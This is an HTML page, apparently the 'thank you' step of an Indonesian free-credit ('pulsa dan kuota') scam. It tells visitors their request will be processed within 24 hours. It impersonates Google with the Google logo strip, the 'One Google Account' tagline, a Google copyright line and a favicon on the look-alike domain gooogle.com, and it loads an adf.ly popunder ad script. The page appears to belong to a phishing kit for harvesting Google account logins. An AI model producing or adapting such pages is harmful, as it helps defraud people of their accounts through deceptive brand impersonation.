<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link href='https://gooogle.com/favicon.co' rel='icon'>
<title>pulsa dan kouta </title>
<script src="js/jquery.min.js"></script>
<link rel="stylesheet" href="js/bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
body { 
  background: url(img/bb.png) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-12 {
 margin:0 auto;
 float:none;

}
</style>

<body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">

<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6">
<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
<img style="border:none;width:100%;max-height:270px;margin:0 auto;" src="img/bb.png"/>
<div style="border:none;" class="btn btn-success btn-lg btn-block"><b><i class="fa fa-google-plus"></i>Permintaan akan di prosess dalam 1x24jam</b></div>
  <script type="text/javascript"> 
    var adfly_id = 14593743; 
    var popunder_frequency_delay = 3; 
</script> 
<script src="https://cdn.adf.ly/js/display.js"></script> 
</div>
<center style="background:white;"><br>
<div class="col-md-12">
<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#f7f7f7;width:100%" class="form-horizontal">
<h4 >
  Terima kasih sudah menggunakan jasa layanan ini
  </h4><br/>
  <div style="width:100%" class="form-group">
  <a  href="https://facebook.com/" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit"> KELUAR </a>
</div>

</div><br><br>
</div>
<div style="height:110px;color: #737373;background-color: #f7f7f7;" class="btn btn-block">
<center><p>One Google Account for everything Google </p></center>
<img src="https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png"/></p>
<p>Copyright &copy; 2018 Google Inc.</p>

</div>
</div>

</div>